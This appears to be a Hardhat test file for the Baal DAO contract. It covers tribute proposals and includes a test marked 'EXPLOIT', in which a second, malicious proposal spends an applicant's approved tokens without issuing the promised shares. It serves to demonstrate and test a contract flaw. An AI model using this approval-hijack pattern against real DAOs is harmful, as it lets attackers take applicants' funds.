import { ethers } from 'hardhat'
import { solidity } from 'ethereum-waffle'
import { use, expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'

import { Baal } from '../src/types/Baal'
import { TestErc20 } from '../src/types/TestErc20'
import { Loot } from '../src/types/Loot'
import { encodeMultiAction } from '../src/util'
import { BigNumber } from '@ethersproject/bignumber'
import { buildContractCall } from '@gnosis.pm/safe-contracts'
import { MultiSend } from '../src/types/MultiSend'
import { ContractFactory } from 'ethers'
import { ConfigExtender } from 'hardhat/types'
import { Test } from 'mocha'

use(solidity)

// chai
//   .use(require('chai-as-promised'))
//   .should();

const revertMessages = {
  molochAlreadyInitialized: 'Initializable: contract is already initialized',
  molochConstructorSharesCannotBe0: 'shares cannot be 0',
  molochConstructorVotingPeriodCannotBe0: 'votingPeriod cannot be 0',
  submitProposalExpired: 'expired',
  submitProposalOffering: 'Baal requires an offering',
  submitProposalVotingPeriod: '!votingPeriod',
  submitProposalArrays: '!array parity',
  submitProposalArrayMax: 'array max',
  submitProposalFlag: '!flag',
  sponsorProposalExpired: 'expired',
  sponsorProposalSponsor: '!sponsor',
  sponsorProposalExists: '!exist',
  sponsorProposalSponsored: 'sponsored',
  submitVoteNotSponsored: '!sponsored',
  submitVoteTimeEnded: 'ended',
  submitVoteVoted: 'voted',
  submitVoteMember: '!member',
  submitVoteWithSigTimeEnded: 'ended',
  submitVoteWithSigVoted: 'voted',
  submitVoteWithSigMember: '!member',
  proposalMisnumbered: '!exist',
  unsetGuildTokensLastToken: 'reverted with panic code 0x32 (Array accessed at an out-of-bounds or negative index)',
  sharesTransferPaused: '!transferable',
  sharesInsufficientBalance: 'reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)',
}

const zeroAddress = '0x0000000000000000000000000000000000000000'

async function blockTime() {
  const block = await ethers.provider.getBlock('latest')
  return block.timestamp
}

async function blockNumber() {
  const block = await ethers.provider.getBlock('latest')
  return block.number
}

async function moveForwardPeriods(periods: number) {
  const goToTime = deploymentConfig.VOTING_PERIOD_IN_SECONDS * periods
  await ethers.provider.send('evm_increaseTime', [goToTime])
  return true
}

const deploymentConfig = {
  GRACE_PERIOD_IN_SECONDS: 43200,
  VOTING_PERIOD_IN_SECONDS: 432000,
  PROPOSAL_OFFERING: 0,
  SPONSOR_THRESHOLD: 1,
  QUORUM_PERCENT: 0,
  TOKEN_NAME: 'wrapped ETH',
  TOKEN_SYMBOL: 'WETH',
}

const abiCoder = ethers.utils.defaultAbiCoder

const getBaalParams = async function (
  baal: Baal,
  multisend: MultiSend,
  lootSingleton: Loot,
  config: {
    PROPOSAL_OFFERING: any
    GRACE_PERIOD_IN_SECONDS: any
    VOTING_PERIOD_IN_SECONDS: any
    QUORUM_PERCENT: any
    SPONSOR_THRESHOLD: any
    TOKEN_NAME: any
    TOKEN_SYMBOL: any
  },
  adminConfig: [boolean, boolean],
  tokens: [string[]],
  shamans: [string[], number[]],
  shares: [string[], number[]],
  loots: [string[], number[]]
) {
  const governanceConfig = abiCoder.encode(
    ['uint32', 'uint32', 'uint256', 'uint256', 'uint256'],
    [config.VOTING_PERIOD_IN_SECONDS, config.GRACE_PERIOD_IN_SECONDS, config.PROPOSAL_OFFERING, config.QUORUM_PERCENT, config.SPONSOR_THRESHOLD]
  )

  const setAdminConfig = await baal.interface.encodeFunctionData('setAdminConfig', adminConfig)
  const setGovernanceConfig = await baal.interface.encodeFunctionData('setGovernanceConfig', [governanceConfig])
  const setGuildTokens = await baal.interface.encodeFunctionData('setGuildTokens', tokens)
  const setShaman = await baal.interface.encodeFunctionData('setShamans', shamans)
  const mintShares = await baal.interface.encodeFunctionData('mintShares', shares)
  const mintLoot = await baal.interface.encodeFunctionData('mintLoot', loots)

  const initalizationActions = encodeMultiAction(
    multisend,
    [setAdminConfig, setGovernanceConfig, setGuildTokens, setShaman, mintShares, mintLoot],
    [baal.address, baal.address, baal.address, baal.address, baal.address, baal.address],
    [BigNumber.from(0), BigNumber.from(0), BigNumber.from(0), BigNumber.from(0), BigNumber.from(0), BigNumber.from(0)],
    [0, 0, 0, 0, 0, 0]
  )

  return abiCoder.encode(
    ['string', 'string', 'address', 'address', 'bytes'],
    [config.TOKEN_NAME, config.TOKEN_SYMBOL, lootSingleton.address, multisend.address, initalizationActions]
  )
}

const verifyProposal = function (prop1: any, prop2: any, overrides?: any) {
  for (let key in prop1) {
    if (Number.isInteger(+key)) {
      continue
    }
    if (overrides && key in overrides) {
      // console.log('override', key)
      expect(prop1[key]).to.equal(overrides[key])
    } else {
      // console.log('check', key)
      expect(prop1[key]).to.equal(prop2[key])
    }
  }
}

describe.only('Tribute proposal type', function () {
  let baal: Baal
  let lootSingleton: Loot
  let LootFactory: ContractFactory
  let ERC20: ContractFactory
  let lootToken: Loot
  let shamanBaal: Baal
  let weth: TestErc20
  let applicantWeth: TestErc20
  let multisend: MultiSend

  let applicant: SignerWithAddress
  let summoner: SignerWithAddress
  let shaman: SignerWithAddress

  let proposal: { [key: string]: any }

  let encodedInitParams: any

  const loot = 500
  const shares = 100
  const sharesPaused = false
  const lootPaused = false

  const yes = true
  const no = false

  this.beforeAll(async function () {
    LootFactory = await ethers.getContractFactory('Loot')
    lootSingleton = (await LootFactory.deploy()) as Loot
  })

  beforeEach(async function () {
    const BaalContract = await ethers.getContractFactory('Baal')
    const MultisendContract = await ethers.getContractFactory('MultiSend')
    ;[summoner, applicant, shaman] = await ethers.getSigners()

    ERC20 = await ethers.getContractFactory('TestERC20')
    weth = (await ERC20.deploy('WETH', 'WETH', 10000000)) as TestErc20
    applicantWeth = weth.connect(applicant)

    multisend = (await MultisendContract.deploy()) as MultiSend

    baal = (await BaalContract.deploy()) as Baal
    shamanBaal = baal.connect(shaman) // needed to send txns to baal as the shaman

    encodedInitParams = await getBaalParams(
      baal,
      multisend,
      lootSingleton,
      deploymentConfig,
      [sharesPaused, lootPaused],
      [[weth.address]],
      [[shaman.address], [7]],
      [[summoner.address], [shares]],
      [[summoner.address], [loot]]
    )

    await baal.setUp(encodedInitParams)

    const lootTokenAddress = await baal.lootToken()

    lootToken = LootFactory.attach(lootTokenAddress) as Loot

    const selfTransferAction = encodeMultiAction(multisend, ['0x'], [baal.address], [BigNumber.from(0)], [0])

    proposal = {
      flag: 0,
      account: summoner.address,
      data: selfTransferAction,
      details: 'all hail baal',
      expiration: 0,
    }
  })

  describe('Dangerous proposal tribute', function () {
    it('Allows applicant to tribute tokens in exchagne for shares', async function () {
      expect(await weth.balanceOf(baal.address)).to.equal(0)

      await weth.transfer(applicant.address, 1000)
      await applicantWeth.approve(baal.address, 100)

      const mintShares = await baal.interface.encodeFunctionData('mintShares', [[applicant.address], [100]])
      const sendTribute = await applicantWeth.interface.encodeFunctionData('transferFrom', [applicant.address, baal.address, 100])

      const encodedProposal = encodeMultiAction(
        multisend,
        [mintShares, sendTribute],
        [baal.address, weth.address],
        [BigNumber.from(0), BigNumber.from(0)],
        [0, 0]
      )
      // const encodedProposal = encodeMultiAction(multisend, [mintShares], [baal.address], [BigNumber.from(0)], [0])

      await baal.submitProposal(encodedProposal, proposal.expiration, ethers.utils.id(proposal.details))
      await baal.submitVote(1, yes)
      await moveForwardPeriods(2)
      await baal.processProposal(1, encodedProposal)
      expect(await weth.balanceOf(baal.address)).to.equal(100)
      expect(await baal.balanceOf(applicant.address)).to.equal(100)
    })

    it('EXPLOIT - Allows another proposal to spend tokens intended for tribute', async function () {
      expect(await weth.balanceOf(baal.address)).to.equal(0)

      await weth.transfer(applicant.address, 1000)
      await applicantWeth.approve(baal.address, 100)

      const mintShares = await baal.interface.encodeFunctionData('mintShares', [[applicant.address], [100]])
      const sendTribute = await applicantWeth.interface.encodeFunctionData('transferFrom', [applicant.address, baal.address, 100])

      const encodedProposal = encodeMultiAction(
        multisend,
        [mintShares, sendTribute],
        [baal.address, weth.address],
        [BigNumber.from(0), BigNumber.from(0)],
        [0, 0]
      )

      // malicious proposal sends tokens but skips issuing shares
      const maliciousProposal = encodeMultiAction(multisend, [sendTribute], [weth.address], [BigNumber.from(0)], [0])
      // const encodedProposal = encodeMultiAction(multisend, [mintShares], [baal.address], [BigNumber.from(0)], [0])

      await baal.submitProposal(encodedProposal, proposal.expiration, ethers.utils.id(proposal.details))
      await baal.submitProposal(maliciousProposal, proposal.expiration, ethers.utils.id(proposal.details))
      await baal.submitVote(1, no)
      await baal.submitVote(2, yes)
      await moveForwardPeriods(2)
      await baal.processProposal(1, encodedProposal)
      await baal.processProposal(2, maliciousProposal)
      expect(await weth.balanceOf(baal.address)).to.equal(100)
      expect(await baal.balanceOf(applicant.address)).to.equal(0)
    })
  })
})
